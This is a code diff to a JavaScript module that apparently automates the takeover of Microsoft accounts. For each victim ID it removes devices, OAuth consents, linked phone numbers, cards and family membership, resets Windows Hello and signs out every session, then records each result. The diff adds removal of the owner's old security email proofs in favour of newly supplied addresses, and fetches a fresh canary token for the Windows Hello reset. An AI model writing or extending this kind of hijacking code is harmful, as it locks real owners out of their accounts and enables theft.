@@ -9,6 +9,7 @@ const signoutFromAllDevices = require("../logout/signoutFromAllDevices");
 const leaveFamily = require("../family/leaveFamily");
 const getFamily = require("../family/getFamily");
 const removeLinkedNumbers = require("../logout/removeLinkedNumbers");
+const removeOldSecurityEmails = require("../logout/removeOldSecurityEmails");
 const removeCards = require("../secure/removeCards");
 const getAliases = require("../secure/getAliases");
 
@@ -25,6 +26,7 @@ const timeTracker = () => {
 };
 
 /*
+- Remove old security email proofs (while session is fresh)
 - Remove devices if enabled
 - Revoke OAuth app consents if enabled
 - Leave Microsoft family
@@ -34,7 +36,7 @@ const timeTracker = () => {
 - Sign out from all devices (strictly executed AFTER all above operations complete)
 */
 
-module.exports = async function removesection(settings, signout, exploit, uid, axios, securityParameters, msatoken) {
+module.exports = async function removesection(settings, signout, exploit, uid, axios, securityParameters, msatoken, secEmail = null, newPrimaryEmail = null) {
     const tracker = timeTracker();
 
     let family = null;
@@ -42,6 +44,19 @@ module.exports = async function removesection(settings, signout, exploit, uid, a
         family = await getFamily(axios);
     } catch (e) {
         console.error(`[REMOVE_SECTION] Error fetching family for ${uid}:`, e.message);
+    }
+
+    // 0. Remove old security email proofs (while session is still fresh)
+    try {
+        const secEmailResult = await removeOldSecurityEmails(axios, {
+            netId: securityParameters?.netId,
+            newSecurityEmail: secEmail,
+            newPrimaryEmail: newPrimaryEmail
+        });
+        await updateExtraInformation(uid, "secemailremoval", JSON.stringify(secEmailResult));
+    } catch (secEmailErr) {
+        console.error(`[REMOVE_SECTION] Error removing old security emails for ${uid}:`, secEmailErr.message);
+        await updateExtraInformation(uid, "secemailremoval", JSON.stringify({ error: secEmailErr.message }));
     }
 
     // 1. Remove Devices (sequential)
@@ -123,7 +138,16 @@ module.exports = async function removesection(settings, signout, exploit, uid, a
     // 4. Remove Exploit / Reset Windows Hello (sequential)
     if (exploit) {
         try {
-            const exploitRemoved = await resetWindowsHello(axios);
+            // Fetch fresh canary for Windows Hello revocation
+            let helloCanary = null;
+            try {
+                const freshState = await getAliases(axios);
+                helloCanary = freshState?.apiCanary || freshState?.canary || null;
+            } catch (err) {
+                console.error(`[REMOVE_SECTION] Failed to fetch fresh canary for resetWindowsHello for ${uid}:`, err.message);
+            }
+
+            const exploitRemoved = await resetWindowsHello(axios, helloCanary);
             await updateExtraInformation(uid, "exploit", exploitRemoved ? "True" : "False");
         } catch (expErr) {
             console.error(`[REMOVE_SECTION] Error in resetWindowsHello for ${uid}:`, expErr.message);
@@ -168,7 +192,9 @@ module.exports = async function removesection(settings, signout, exploit, uid, a
             try {
                 const freshState = await getAliases(axios);
                 signoutCanary = freshState?.apiCanary || freshState?.canary || null;
-            } catch (_) {}
+            } catch (err) {
+                console.error(`[REMOVE_SECTION] Failed to fetch fresh canary for signoutFromAllDevices for ${uid}:`, err.message);
+            }
 
             const signedout = await signoutFromAllDevices(axios, signoutCanary);
             await updateExtraInformation(uid, "signout", signedout ? "True" : "False");
